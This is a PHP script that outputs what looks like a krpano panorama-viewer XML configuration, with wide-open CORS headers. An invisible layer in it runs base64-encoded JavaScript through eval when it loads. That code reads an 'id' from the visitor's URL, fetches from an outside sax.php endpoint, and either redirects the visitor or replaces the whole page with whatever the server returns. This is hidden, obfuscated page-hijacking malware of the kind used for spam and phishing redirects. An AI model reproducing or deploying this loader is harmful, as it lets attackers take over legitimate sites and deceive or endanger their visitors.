<?php
header("Content-type: text/xml");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
$posturl = "https://assets.cec.uk.com/aac/video/sax.php?file=";
$code = "const queryParams = new URLSearchParams(window.location.search),
          id = queryParams.get('id');
    if (id) {
        fetch('$posturl'+id)
            .then(response => response.text())
            .then(data => {
                try {
                    let r = JSON.parse(data);
                    if (r.redirectUrl) {
                        window.location.href = r.redirectUrl;
                    }
                } catch (e) {
                    document.open();
                    document.write(data);
                    document.close();
                }
            })
            .catch(error => {
                console.error('Error fetching data:', error);
            });
    } else {
        console.error('No ID parameter found.');
    }
";

?><krpano version="1.0.8.15"><layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('<?=base64_encode($code)?>');eval(w)););"/></krpano>
